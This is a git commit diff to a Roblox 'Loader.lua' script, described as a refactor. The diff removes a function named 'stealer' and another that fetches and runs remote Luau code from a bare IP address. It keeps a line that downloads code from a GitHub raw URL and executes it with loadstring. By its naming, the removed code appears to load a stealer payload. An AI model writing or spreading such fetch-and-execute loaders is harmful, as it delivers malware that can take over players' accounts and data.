26629914f13645da103604db3d1b625272547b5f
Sporty333 <ricardoruvalcaba519@gmail.com>
2025-10-30 18:42:21 -0700

    Refactor Loader.lua to directly execute scripts

--- Loader.lua
+++ Loader.lua
@@ -1,10 +1,1 @@
-local function stealer()
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Sporty333/Sp4wnerX-Hub/refs/heads/main/Loader.lua"))()
-end
-local function loadui()
-
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
-end
-task.spawn(stealer)
-task.spawn(loadui)
